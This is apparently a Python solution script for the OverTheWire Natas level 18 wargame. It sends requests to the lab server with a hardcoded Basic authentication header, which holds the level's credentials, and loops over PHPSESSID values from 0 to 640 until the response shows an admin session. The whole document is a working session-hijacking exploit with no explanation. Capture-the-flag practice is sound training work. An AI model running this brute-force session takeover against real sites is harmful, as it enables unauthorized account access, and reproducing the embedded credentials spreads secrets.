#! /bin/python3

import requests
import re

def urlconn(var) :
    url = 'http://natas18.natas.labs.overthewire.org/index.php'
    headers = {'Authorization' : 'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==', 'Cookie' : var}
    payload = {'debug' : '1', 'username' : 'admin', 'password' : 'fgdsg'}

    r = requests.get(url,headers=headers,data=payload)

    return (re.findall('regular', r.text, re.MULTILINE))

str1 = 'PHPSESSID='

for i in range(641) :
    print (str(i) + " ", end='')
    str2 = str1 + str(i)
    if urlconn(str2) :
        print ("not this one")
    else :
        print (" Got it")
        break


